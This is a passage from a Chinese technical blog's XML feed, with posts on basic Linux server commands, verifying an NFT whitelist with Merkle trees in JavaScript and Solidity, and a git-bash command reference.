class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>区块链应用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux操作小结</title>
    <link href="/2022/09/06/Centos%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0(%E5%AE%9D%E5%A1%94)/"/>
    <url>/2022/09/06/Centos%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0(%E5%AE%9D%E5%A1%94)/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /etc/init.d/bt default <span class="hljs-comment">#获取服务器默认密码</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ isof -i:80 <span class="hljs-comment"># 查看80端口下的进程</span><br></code></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol><li>ctrl + L 清屏</li><li>pwd 查看当前路径</li><li>touch 创建文件</li><li>mkdir 创建文件夹</li><li>rm 删除文件或目录</li><li>rm -rf 强制删除并且无法恢复（慎用）</li><li>wc 统计并且输出文件的行数单词数和字节数</li><li>打包与压缩：tar -zcvf xxx.tar</li><li>解包与解压：tar -zxvf xxx.tar</li></ol><h2 id="vim操作"><a href="#vim操作" class="headerlink" title="vim操作"></a>vim操作</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">不编辑内容直接退出，在命令模式下输入</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">:q</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">编辑内容不保存直接退出，在命令模式下输入</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">:q!</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">编辑内容后保存退出，在命令模式下输入</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">:wq</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">将光标定在文件第一行</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">gg</span><br></code></pre></td></tr></table></figure><h2 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h2><blockquote><p>新开一个任务终端，用于后台运行！</p></blockquote><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yum -y install screen</span><br></code></pre></td></tr></table></figure><h3 id="创建一个叫demo的screen任务"><a href="#创建一个叫demo的screen任务" class="headerlink" title="创建一个叫demo的screen任务"></a>创建一个叫demo的screen任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">screen -S demo</span><br></code></pre></td></tr></table></figure><h3 id="查看screen任务"><a href="#查看screen任务" class="headerlink" title="查看screen任务"></a>查看screen任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">screen -<span class="hljs-built_in">ls</span></span><br></code></pre></td></tr></table></figure><h3 id="将screen任务放到后台"><a href="#将screen任务放到后台" class="headerlink" title="将screen任务放到后台"></a>将screen任务放到后台</h3><p>快捷键 <code>ctrl</code>+<code>a</code>+<code>d</code></p><h3 id="进入screen任务"><a href="#进入screen任务" class="headerlink" title="进入screen任务"></a>进入screen任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">screen -r &#123;pid&#125;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">或者</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">screen -r &#123;task_name&#125;</span><br></code></pre></td></tr></table></figure><h3 id="删除screen任务"><a href="#删除screen任务" class="headerlink" title="删除screen任务"></a>删除screen任务</h3><p>使用 <code>-r</code> 进入screen任务之后 输入  <code>exit</code></p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">/etc/init.d/iptables stop <span class="hljs-comment">#关闭防火墙</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">iptables -nL  <span class="hljs-comment">#查看iptables详细策略信息</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">iptables -A INPUT -p tcp --dport 8080 -j ACCEPT <span class="hljs-comment">#放通入方向的8080端口</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">iptables -A OUTPUT -p tcp --dport 8080 -j ACCEPT <span class="hljs-comment">#放通出方向的8080端口</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">iptables  -F： <span class="hljs-comment">#清除所有制订的规则</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>服务器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Merkle树——验证NFT白名单</title>
    <link href="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/"/>
    <url>/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在我们今天所知道和喜爱的区块链出现之前，默克尔树一直是密码学和计算机科学领域的一个方面。如今，我们开始慢慢看到它们在链上更频繁地<u>被用于数据验证</u>的目的。</p></blockquote><h2 id="1-什么是默克尔树？"><a href="#1-什么是默克尔树？" class="headerlink" title="1. 什么是默克尔树？"></a>1. 什么是默克尔树？</h2><p>默克尔树是一种树状结构，树上的每个节点都由一个值表示，这个值是一些加密哈希函数的结果。哈希函数是单向的，<mark>从一个输入产生一个输出很容易</mark>，<mark>但从一个输出确定一个输入在计算上是不可行的</mark>。默克尔树有3种类型的节点，如下所示：</p><ol><li><strong>叶子节点</strong> - 叶子节点位于树的最底部，它们的值是<strong>原始数据</strong>的哈希值。一棵树上有多少个叶子节点，就有多少个需要哈希的原始数据。例如，如果有7个数据需要被哈希，就会有7个叶子节点。</li><li><strong>父节点</strong> - 父节点可以位于树的不同层次，这取决于整个树的大小，父节点总是位于叶节点之上。父节点的值是由它下面的节点的哈希值决定的，通常从左到右开始。由于不同的输入总是会产生不同的哈希值，不考虑哈希值的碰撞，<mark>节点哈希值的连接顺序很重要</mark>。</li><li><strong>根节点</strong> - 根节点位于树的顶端，由位于它下面的两个父节点的哈希值连接而成，同样从左到右开始。任何默克尔树上都只有一个根节点，根节点拥有根哈希值。</li></ol><h2 id="2-默克尔树结构"><a href="#2-默克尔树结构" class="headerlink" title="2. 默克尔树结构"></a>2. 默克尔树结构</h2><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/1.webp"></p><h3 id="简化它"><a href="#简化它" class="headerlink" title="简化它"></a>简化它</h3><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/2.png"></p><h2 id="3-为什么需要默克尔树？"><a href="#3-为什么需要默克尔树？" class="headerlink" title="3. 为什么需要默克尔树？"></a>3. 为什么需要默克尔树？</h2><h3 id="3-1-背景"><a href="#3-1-背景" class="headerlink" title="3.1 背景"></a>3.1 背景</h3><p>在NFT（ERC-721）的背景下使用Merkle树，白名单为选定的参与者群体保留一定数量的代币。</p><p>白名单地址将会预先计算成Merkle对象。</p><p>在这种情况下，可以让一个叶子节点代表我们白名单中的一个钱包地址的哈希值。</p><h3 id="3-2-痛点"><a href="#3-2-痛点" class="headerlink" title="3.2 痛点"></a>3.2 痛点</h3><p>前面提到过哈希函数是单向的——<mark>从一个输入产生一个输出很容易</mark>，<mark>但从一个输出确定一个输入在计算上是不可行的</mark>，并且连接顺序也将决定结果。</p><p><strong>Example</strong>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">hash（hash1,hash2） != <span class="hljs-title function_">hash</span>(hash2,hash1)<br></code></pre></td></tr></table></figure><p>在NFT白名单实例中，将会使用哈希值进行数据安全验证。</p><p>因此在这种情况下，直系验证是非常困难的，需要非常大的计算量和资源。</p><h3 id="传统验证"><a href="#传统验证" class="headerlink" title="传统验证"></a>传统验证</h3><blockquote><p>验证根哈希值是否相同，这看似很简单，但问题就在于，当你去验证一个地址时，到底将该地址哈希与哪个叶子哈希值进行替换并验证？这是很难计算得知的。</p></blockquote><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/3.png"></p><p><strong>根哈希验证的另一个难点（了解即可）</strong></p><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/4.png"></p><h3 id="3-3-如何解决——取得默克尔证明"><a href="#3-3-如何解决——取得默克尔证明" class="headerlink" title="3.3 如何解决——取得默克尔证明"></a>3.3 如何解决——取得默克尔证明</h3><p>Merkle树妙处在于它<strong>根本不需要与根哈希</strong>，<strong>父哈希等等进行等量校对</strong>。</p><p>如果试图验证一个叶子节点属于我们的树，<mark>只需要知道直接相邻的叶子节点哈希值</mark>(如果有的话)，<mark>以及叶子节点正上方相邻的父节点哈希值</mark>就可以了。</p><p>如果这个Merkle树有四层，五层甚至一百层，那么返回的哈希值数量将会相应增长！</p><h2 id="4-实战"><a href="#4-实战" class="headerlink" title="4. 实战"></a>4. 实战</h2><blockquote><p>实战将会带你实例化默克尔树对象以及取得默克尔树验证！</p></blockquote><h3 id="4-1-JavaScript实现"><a href="#4-1-JavaScript实现" class="headerlink" title="4.1 JavaScript实现"></a>4.1 JavaScript实现</h3><p><strong>安装</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm i -D merkletreejs keccak256<br></code></pre></td></tr></table></figure><p><mark><code>merkletree.js</code></mark></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123;<span class="hljs-title class_">MerkleTree</span>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;merkletreejs&#x27;</span>)<br><br><span class="hljs-keyword">const</span> keccak256 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;keccak256&#x27;</span>)<br><br><br><span class="hljs-keyword">let</span> whitelistAddresses = [<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2815&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2816&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2817&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2818&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2819&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2820&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2821&quot;</span>       <br>]<br><br><span class="hljs-comment">//buffer化叶子结点</span><br><span class="hljs-keyword">const</span> leafNodes = whitelistAddresses.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">addr</span> =&gt;</span> <span class="hljs-title function_">keccak256</span>(addr))<br><br><span class="hljs-comment">//实例化默克尔树</span><br><span class="hljs-keyword">const</span> merkleTree = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MerkleTree</span>(leafNodes,keccak256,&#123;<span class="hljs-attr">sortPairs</span>:<span class="hljs-literal">true</span>&#125;);<br><br><span class="hljs-comment">//获取根哈希值</span><br><span class="hljs-keyword">const</span> rootHash = merkleTree.<span class="hljs-title function_">getRoot</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Whitelist Merkle Tree\n&#x27;</span>,merkleTree.<span class="hljs-title function_">toString</span>())<br><br><span class="hljs-comment">//定义你所需要验证的地址</span><br><span class="hljs-keyword">const</span> claimingAddress = leafNodes[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment">//取得默克尔树证明</span><br><span class="hljs-keyword">const</span> hexProof = merkleTree.<span class="hljs-title function_">getHexProof</span>(claimingAddress)<br><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Merkle Proof for Address is\n`</span>,hexProof)<br><br><br><span class="hljs-comment">//当你传入一个错误的白名单地址时</span><br><span class="hljs-keyword">const</span> errAddress = <span class="hljs-title function_">keccak256</span>(<span class="hljs-string">&#x27;0x98D9897e0F0389158978B384E6ecF3cf93153876&#x27;</span>);<br><br><span class="hljs-comment">//取得默克尔证明</span><br><span class="hljs-keyword">const</span> hexProof1 = merkleTree.<span class="hljs-title function_">getHexProof</span>(errAddress)<br><br><span class="hljs-comment">//将会得到空数组！</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Merkle Proof for error Address is\n`</span>,hexProof1)<br></code></pre></td></tr></table></figure><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/5.png"></p><blockquote><p> 由于该默克尔树是由七个叶子节点组成的，所以这是一个三层结构的树，因此默克尔证明将会取得三个哈希值作为凭证。当树结构为五层，六层… 默克尔证明的哈希值数量会对应增加！</p></blockquote><h3 id="4-2-智能合约实现"><a href="#4-2-智能合约实现" class="headerlink" title="4.2 智能合约实现"></a>4.2 智能合约实现</h3><p><code>Merkletree.sol</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: SEE LICENSE IN LICENSE<br>pragma solidity ^0.8.0;<br><br><br>//导入默克尔树智能合约<br>import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/MerkleProof.sol&quot;;<br><br>contract Merkletree&#123;<br><br>    //该根哈希值需要你用到刚刚js生成的merkle树的根哈希（记得加上0x）<br>    bytes32 public merkleRoot = 0x3a6036ef5f6da50ea7f3dc72c7c83c1e6d5be6cded8ad495fb4b0bb870f1c093;<br>    <br>    //记录白名单是否被使用过<br>    mapping(address =&gt; bool) public whitelistClaimed;<br><br>    //使用白名单函数<br>    function whitelistMint(bytes32[] calldata _merkleProof) public&#123;<br>        //要求白名单没有被使用过<br>        require(!whitelistClaimed[msg.sender],&quot;Address has already claimed&quot;);<br>        //初始化叶子哈希<br>        bytes32 leaf = keccak256(abi.encodePacked(msg.sender));<br>        //将叶子哈希传入merkle树验证，查看是否是白名单<br>        require(MerkleProof.verify(_merkleProof, merkleRoot , leaf),&quot;Invalid proof&quot;);<br>        //是白名单，记录该白名单使用过<br>        whitelistClaimed[msg.sender] = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>Merkle树是区块链中非常重要的数据结构，它的应用极大地减小了哈希安全验证的难度，提高了合约安全程度，减少了被攻击成功的可能性。</p><p>感谢阅读！</p><blockquote><p>Blog by Science_jun</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>区块链数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Merkle树</tag>
      
      <tag>数据验证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git-bash操作简记</title>
    <link href="/2022/09/01/Git%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/"/>
    <url>/2022/09/01/Git%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="ssh配置"><a href="#ssh配置" class="headerlink" title="ssh配置"></a>ssh配置</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">使用以下命令生成 SSH Key</span><br>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看生成的密钥</span><br>cat ~/.ssh/id_rsa.pub<br><span class="hljs-meta prompt_">#</span><span class="language-bash">验证是否成功</span><br>ssh -T git@github.com<br></code></pre></td></tr></table></figure><h2 id="1-git-add"><a href="#1-git-add" class="headerlink" title="1. git add"></a>1. git add</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">清除暂存区缓存</span><br>git rm -r --cached .<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加一个或多个文件到暂存区</span><br>git add [file1] [file2] ...<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加指定目录到暂存区</span><br>git add [dir]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加当前目录下的所有文件到暂存区</span><br>git add .<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加当前项目文件到暂存区</span><br>git add -A<br></code></pre></td></tr></table></figure><h2 id="2-git-status"><a href="#2-git-status" class="headerlink" title="2. git status"></a>2. git status</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git status 命令用于查看在你上次提交之后是否有对文件进行再次修改</span><br>git status<br><span class="hljs-meta prompt_">#</span><span class="language-bash">使用 -s 参数来获得简短的输出结果</span><br>git status -s<br></code></pre></td></tr></table></figure><h2 id="3-git-diff"><a href="#3-git-diff" class="headerlink" title="3. git diff"></a>3. git diff</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git diff 命令比较文件的不同，即比较文件在暂存区和工作区的差异。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">git diff 命令显示已写入暂存区和已经被修改但尚未写入暂存区文件的区别。</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">尚未缓存的改动</span><br>git diff [file]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看已缓存的改动</span><br>git diff --cached [file]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看已缓存的与未缓存的所有改动</span><br>git diff HEAD<br><span class="hljs-meta prompt_">#</span><span class="language-bash">显示摘要而非整个diff</span><br>git diff --stat<br></code></pre></td></tr></table></figure><h2 id="4-git-commit"><a href="#4-git-commit" class="headerlink" title="4. git commit"></a>4. git commit</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git commit 命令将暂存区内容添加到本地仓库中。</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">提交暂存区到本地仓库中,附加备注信息</span><br>git commit -m [message]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">不需要执行 git add 命令，直接来提交</span><br>git commit -a<br></code></pre></td></tr></table></figure><h2 id="5-设置提交代码时的用户信息"><a href="#5-设置提交代码时的用户信息" class="headerlink" title="5. 设置提交代码时的用户信息"></a>5. 设置提交代码时的用户信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global user.name [name]<br>git config --global user.email [email]<br></code></pre></td></tr></table></figure><h2 id="6-git-reset"><a href="#6-git-reset" class="headerlink" title="6. git reset"></a>6. git reset</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git reset 命令用于回退版本，可以指定退回某一次提交的版本。</span><br>git reset [--soft | --mixed | --hard] [HEAD]<br></code></pre></td></tr></table></figure><h2 id="7-git-rm"><a href="#7-git-rm" class="headerlink" title="7. git rm"></a>7. git rm</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">将文件从暂存区和工作区中删除</span><br>git rm &lt;file&gt;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">强行从暂存区和工作区中删除修改后的 runoob.txt 文件：</span><br>git rm -f runoob.txt <br><span class="hljs-meta prompt_">#</span><span class="language-bash">把文件从暂存区域移除，但仍然希望保留在当前工作目录中，换句话说，仅是从跟踪清单中删除，使用 --cached 选项即可</span><br>git rm --cached &lt;file&gt;<br></code></pre></td></tr></table></figure><h2 id="8-git-mv"><a href="#8-git-mv" class="headerlink" title="8. git mv"></a>8. git mv</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git <span class="hljs-built_in">mv</span> 命令用于移动或重命名一个文件、目录或软连接</span><br>git mv [file] [newfile]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数</span><br>git mv -f [file] [newfile]<br></code></pre></td></tr></table></figure><h2 id="9-git-log-查看历史提交记录"><a href="#9-git-log-查看历史提交记录" class="headerlink" title="9. git log - 查看历史提交记录"></a>9. <strong>git log</strong> - 查看历史提交记录</h2><h2 id="10-git-remote"><a href="#10-git-remote" class="headerlink" title="10. git remote"></a>10. git remote</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">显示所有远程仓库</span><br>git remote -v<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加远程版本库</span><br>git remote add [给他取名] [url]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">例子：提交到 Github</span><br>git remote add origin git@github.com:tianqixin/runoob-git-test.git<br>git push -u origin<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除远程仓库</span><br>git remote rm name  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">修改仓库名</span><br>git remote rename old_name new_name <br></code></pre></td></tr></table></figure><h2 id="11-git-fetch"><a href="#11-git-fetch" class="headerlink" title="11. git fetch"></a>11. git fetch</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">以上命令将服务器上的任何更新（假设有人这时候推送到服务器了）合并到你的当前分支。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">然后我们在本地更新修改</span><br>git fetch origin<br><span class="hljs-meta prompt_">#</span><span class="language-bash">以上信息<span class="hljs-string">&quot;0205aab..febd8ed main -&gt; origin/main&quot;</span> 说明 main 分支已被更新，我们可以使用以下命令将更新同步到本地：</span><br>git merge origin/main<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看 README.md 文件内容：</span><br>cat README.md <br></code></pre></td></tr></table></figure><h2 id="12-git-pull"><a href="#12-git-pull" class="headerlink" title="12. git pull"></a>12. git pull</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git pull 命令用于从远程获取代码并合并本地的版本。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">git pull 其实就是 git fetch 和git merge FETCH_HEAD的简写</span><br><br>git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">例子</span><br>git pull origin main<br></code></pre></td></tr></table></figure><h2 id="13-git-push"><a href="#13-git-push" class="headerlink" title="13. git push"></a>13. git push</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除主机的分支可以使用 --delete 参数，以下命令表示删除origin主机的master分支</span><br>git push origin --delete master<br><span class="hljs-meta prompt_">#</span><span class="language-bash">如果本地版本与远程版本有差异，但又要强制推送可以使用 --force 参数</span><br>git push --force origin master<br></code></pre></td></tr></table></figure><h2 id="Git进阶"><a href="#Git进阶" class="headerlink" title="Git进阶"></a>Git进阶</h2><h3 id="1-上传后打不开文件夹（出现白箭头）"><a href="#1-上传后打不开文件夹（出现白箭头）" class="headerlink" title="1. 上传后打不开文件夹（出现白箭头）"></a>1. 